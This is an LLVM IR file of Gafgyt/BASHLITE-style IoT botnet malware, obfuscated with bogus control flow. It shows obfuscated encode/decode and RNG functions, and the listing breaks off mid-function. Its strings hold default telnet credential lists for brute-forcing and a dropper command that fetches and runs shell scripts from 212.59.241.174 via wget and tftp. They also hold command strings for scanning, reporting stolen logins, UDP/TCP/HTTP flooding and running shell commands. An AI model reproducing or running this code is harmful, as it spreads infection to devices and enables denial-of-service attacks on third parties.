; ModuleID = 'host/ir_bcf/L7.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.udphdr = type { %union.anon.2 }
%union.anon.2 = type { %struct.anon.3 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.state_t = type { i32, i8 }
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@encodes = global [87 x i8] c"<>@o$:,.l+*^?=)(|AB&%;D\22!wkUxzvutsrqp_nm-ihgfFCcba~K23456789eyd1XSNQWTZMIRHGVOYLjPJE/][", align 16
@decodes = global [87 x i8] c"0123456789abcdefghijklmnopqrstuvzywxABCDEFGHIJKLMNOPQRSTUVZYWX|:. !#-/;&*'\22\0A\0D\00>$%(),?=@", align 16
@commServer = global [1 x i8*] [i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@usernames = global [7 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"login\00\00", align 1
@.str.6 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@passwords = global [14 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.14, i32 0, i32 0)], align 16
@.str.7 = private unnamed_addr constant [6 x i8] c"toor\00\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@.str.9 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.10 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.12 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.13 = private unnamed_addr constant [6 x i8] c"pass\00\00", align 1
@.str.14 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.88 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.15 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.16 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.17 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.18 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.19 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.20 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.21 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.22 = private unnamed_addr constant [10 x i8] c"recv: %s\0A\00", align 1
@.str.23 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@ipState = internal global [5 x i8] zeroinitializer, align 1
@.str.24 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.25 = private unnamed_addr constant [11 x i8] c"%d.%d.%d.0\00", align 1
@.str.26 = private unnamed_addr constant [6 x i8] c"ogin:\00", align 1
@.str.27 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.28 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.29 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.31 = private unnamed_addr constant [266 x i8] c"cd /tmp; wget http://212.59.241.174/bins.sh; chmod 777 bins.sh; sh bins.sh; busybox tftp 212.59.241.174 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 212.59.241.174; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh\0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [50 x i8] c"/bin/busybox;echo -e '\5C147\5C141\5C171\5C146\5C147\5C164'\0D\0A\00", align 1
@.str.33 = private unnamed_addr constant [7 x i8] c"gayfgt\00", align 1
@.str.34 = private unnamed_addr constant [11 x i8] c"multi-call\00", align 1
@.str.35 = private unnamed_addr constant [16 x i8] c"REPORT %s:%s:%s\00", align 1
@.str.36 = private unnamed_addr constant [14 x i8] c"REPORT %s:%s:\00", align 1
@.str.37 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.38 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.39 = private unnamed_addr constant [18 x i8] c"wget -O /tmp/fff \00", align 1
@.str.40 = private unnamed_addr constant [14 x i8] c" > /dev/null \00", align 1
@.str.41 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.42 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.43 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.44 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.45 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.46 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.47 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.48 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.49 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.50 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.51 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.52 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.53 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.54 = private unnamed_addr constant [17 x i8] c"SCANNER ON | OFF\00", align 1
@.str.55 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.56 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.57 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.58 = private unnamed_addr constant [36 x i8] c"HOLD Flooding %s:%d for %d seconds.\00", align 1
@.str.59 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.60 = private unnamed_addr constant [36 x i8] c"JUNK Flooding %s:%d for %d seconds.\00", align 1
@.str.61 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.62 = private unnamed_addr constant [32 x i8] c"UDP Flooding %s for %d seconds.\00", align 1
@.str.63 = private unnamed_addr constant [35 x i8] c"UDP Flooding %s:%d for %d seconds.\00", align 1
@.str.64 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.65 = private unnamed_addr constant [33 x i8] c"HTTP Flooding %s for %d seconds.\00", align 1
@.str.66 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.67 = private unnamed_addr constant [32 x i8] c"TCP Flooding %s for %d seconds.\00", align 1
@.str.68 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.69 = private unnamed_addr constant [11 x i8] c"Killed %d.\00", align 1
@.str.70 = private unnamed_addr constant [13 x i8] c"None Killed.\00", align 1
@.str.71 = private unnamed_addr constant [10 x i8] c"LOLNOGTFO\00", align 1
@.str.72 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.73 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.74 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.75 = private unnamed_addr constant [7 x i8] c"GAYFGT\00", align 1
@.str.76 = private unnamed_addr constant [36 x i8] c"MAC: %02X:%02X:%02X:%02X:%02X:%02X\0A\00", align 1
@.str.77 = private unnamed_addr constant [13 x i8] c"fork failed\0A\00", align 1
@.str.78 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.79 = private unnamed_addr constant [22 x i8] c"Failed to connect...\0A\00", align 1
@.str.80 = private unnamed_addr constant [9 x i8] c"BUILD %s\00", align 1
@.str.81 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.82 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.83 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.84 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.85 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.86 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.87 = private unnamed_addr constant [24 x i8] c"Link closed by server.\0A\00", align 1
@x = common global i32 0
@y = common global i32 0
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0
@x.57 = common global i32 0
@y.58 = common global i32 0
@x.59 = common global i32 0
@y.60 = common global i32 0
@x.61 = common global i32 0
@y.62 = common global i32 0
@x.63 = common global i32 0
@y.64 = common global i32 0
@x.65 = common global i32 0
@y.66 = common global i32 0
@x.67 = common global i32 0
@y.68 = common global i32 0
@x.69 = common global i32 0
@y.70 = common global i32 0
@x.71 = common global i32 0
@y.72 = common global i32 0
@x.73 = common global i32 0
@y.74 = common global i32 0
@x.75 = common global i32 0
@y.76 = common global i32 0
@x.77 = common global i32 0
@y.78 = common global i32 0
@x.79 = common global i32 0
@y.80 = common global i32 0
@x.81 = common global i32 0
@y.82 = common global i32 0
@x.83 = common global i32 0
@y.84 = common global i32 0
@x.85 = common global i32 0
@y.86 = common global i32 0
@x.87 = common global i32 0
@y.88 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define i8* @encode(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca [512 x i8], align 16
  %7 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %8 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %8, i8 0, i64 512, i32 16, i1 false)
  br label %9

; <label>:9:                                      ; preds = %originalBBpart220, %1
  %10 = load i32, i32* %3, align 4
  %11 = sext i32 %10 to i64
  %12 = load i8*, i8** %2, align 8
  %13 = call i64 @strlen(i8* %12) #10
  %14 = icmp ult i64 %11, %13
  br i1 %14, label %15, label %98

; <label>:15:                                     ; preds = %9
  store i32 0, i32* %5, align 4
  br label %16

; <label>:16:                                     ; preds = %originalBBpart213, %15
  %17 = load i32, i32* @x
  %18 = load i32, i32* @y
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %16
  %25 = load i32, i32* %5, align 4
  %26 = sext i32 %25 to i64
  %27 = icmp ule i64 %26, 87
  %28 = load i32, i32* @x
  %29 = load i32, i32* @y
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %27, label %36, label %79

; <label>:36:                                     ; preds = %originalBBpart2
  %37 = load i8*, i8** %2, align 8
  %38 = load i32, i32* %3, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds i8, i8* %37, i64 %39
  %41 = load i8, i8* %40, align 1
  %42 = sext i8 %41 to i32
  %43 = load i32, i32* %5, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds [87 x i8], [87 x i8]* @decodes, i64 0, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %42, %47
  br i1 %48, label %49, label %59

; <label>:49:                                     ; preds = %36
  %50 = load i32, i32* %5, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds [87 x i8], [87 x i8]* @encodes, i64 0, i64 %51
  %53 = load i8, i8* %52, align 1
  %54 = load i32, i32* %4, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 %55
  store i8 %53, i8* %56, align 1
  %57 = load i32, i32* %4, align 4
  %58 = add nsw i32 %57, 1
  store i32 %58, i32* %4, align 4
  br label %59

; <label>:59:                                     ; preds = %49, %36
  br label %60

; <label>:60:                                     ; preds = %59
  %61 = load i32, i32* @x
  %62 = load i32, i32* @y
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %60
  %69 = load i32, i32* %5, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %5, align 4
  %71 = load i32, i32* @x
  %72 = load i32, i32* @y
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBBpart213, label %originalBB1alteredBB

originalBBpart213:                                ; preds = %originalBB1
  br label %16

; <label>:79:                                     ; preds = %originalBBpart2
  %80 = load i32, i32* @x
  %81 = load i32, i32* @y
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %79
  %88 = load i32, i32* %3, align 4
  %89 = add nsw i32 %88, 1
  store i32 %89, i32* %3, align 4
  %90 = load i32, i32* @x
  %91 = load i32, i32* @y
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBBpart220, label %originalBB15alteredBB

originalBBpart220:                                ; preds = %originalBB15
  br label %9

; <label>:98:                                     ; preds = %9
  %99 = load i32, i32* %4, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 %100
  store i8 0, i8* %101, align 1
  %102 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i32 0, i32 0
  %103 = call noalias i8* @strdup(i8* %102) #4
  store i8* %103, i8** %7, align 8
  %104 = load i8*, i8** %7, align 8
  ret i8* %104

originalBBalteredBB:                              ; preds = %originalBB, %16
  %105 = load i32, i32* %5, align 4
  %106 = sext i32 %105 to i64
  %107 = icmp ule i64 %106, 87
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %60
  %108 = load i32, i32* %5, align 4
  %_ = sub i32 0, %108
  %gen = add i32 %_, 1
  %_2 = sub i32 0, %108
  %gen3 = add i32 %_2, 1
  %_4 = sub i32 0, %108
  %gen5 = add i32 %_4, 1
  %_6 = sub i32 %108, 1
  %gen7 = mul i32 %_6, 1
  %_8 = sub i32 %108, 1
  %gen9 = mul i32 %_8, 1
  %_10 = sub i32 0, %108
  %gen11 = add i32 %_10, 1
  %109 = add nsw i32 %108, 1
  store i32 %109, i32* %5, align 4
  br label %originalBB1

originalBB15alteredBB:                            ; preds = %originalBB15, %79
  %110 = load i32, i32* %3, align 4
  %_16 = sub i32 0, %110
  %gen17 = add i32 %_16, 1
  %_18 = shl i32 %110, 1
  %111 = add nsw i32 %110, 1
  store i32 %111, i32* %3, align 4
  br label %originalBB15
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #1

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind
declare noalias i8* @strdup(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i8* @decode(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca [512 x i8], align 16
  %7 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %8 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %8, i8 0, i64 512, i32 16, i1 false)
  br label %9

; <label>:9:                                      ; preds = %47, %1
  %10 = load i32, i32* %3, align 4
  %11 = sext i32 %10 to i64
  %12 = load i8*, i8** %2, align 8
  %13 = call i64 @strlen(i8* %12) #10
  %14 = icmp ult i64 %11, %13
  br i1 %14, label %15, label %50

; <label>:15:                                     ; preds = %9
  store i32 0, i32* %5, align 4
  br label %16

; <label>:16:                                     ; preds = %44, %15
  %17 = load i32, i32* %5, align 4
  %18 = sext i32 %17 to i64
  %19 = icmp ule i64 %18, 87
  br i1 %19, label %20, label %47

; <label>:20:                                     ; preds = %16
  %21 = load i8*, i8** %2, align 8
  %22 = load i32, i32* %3, align 4
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds i8, i8* %21, i64 %23
  %25 = load i8, i8* %24, align 1
  %26 = sext i8 %25 to i32
  %27 = load i32, i32* %5, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds [87 x i8], [87 x i8]* @encodes, i64 0, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp eq i32 %26, %31
  br i1 %32, label %33, label %43

; <label>:33:                                     ; preds = %20
  %34 = load i32, i32* %5, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [87 x i8], [87 x i8]* @decodes, i64 0, i64 %35
  %37 = load i8, i8* %36, align 1
  %38 = load i32, i32* %4, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 %39
  store i8 %37, i8* %40, align 1
  %41 = load i32, i32* %4, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %4, align 4
  br label %43

; <label>:43:                                     ; preds = %33, %20
  br label %44

; <label>:44:                                     ; preds = %43
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  store i32 %46, i32* %5, align 4
  br label %16

; <label>:47:                                     ; preds = %16
  %48 = load i32, i32* %3, align 4
  %49 = add nsw i32 %48, 1
  store i32 %49, i32* %3, align 4
  br label %9

; <label>:50:                                     ; preds = %9
  %51 = load i32, i32* @x.1
  %52 = load i32, i32* @y.2
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %50
  %59 = load i32, i32* %4, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 %60
  store i8 0, i8* %61, align 1
  %62 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i32 0, i32 0
  %63 = call noalias i8* @strdup(i8* %62) #4
  store i8* %63, i8** %7, align 8
  %64 = load i8*, i8** %7, align 8
  %65 = load i32, i32* @x.1
  %66 = load i32, i32* @y.2
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i8* %64

originalBBalteredBB:                              ; preds = %originalBB, %50
  %73 = load i32, i32* %4, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 %74
  store i8 0, i8* %75, align 1
  %76 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i32 0, i32 0
  %77 = call noalias i8* @strdup(i8* %76) #4
  store i8* %77, i8** %7, align 8
  %78 = load i8*, i8** %7, align 8
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

; <label>:10:                                     ; preds = %originalBBpart266, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %66

; <label>:13:                                     ; preds = %10
  %14 = load i32, i32* @x.3
  %15 = load i32, i32* @y.4
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %13
  %22 = load i32, i32* %3, align 4
  %23 = sub nsw i32 %22, 3
  %24 = sext i32 %23 to i64
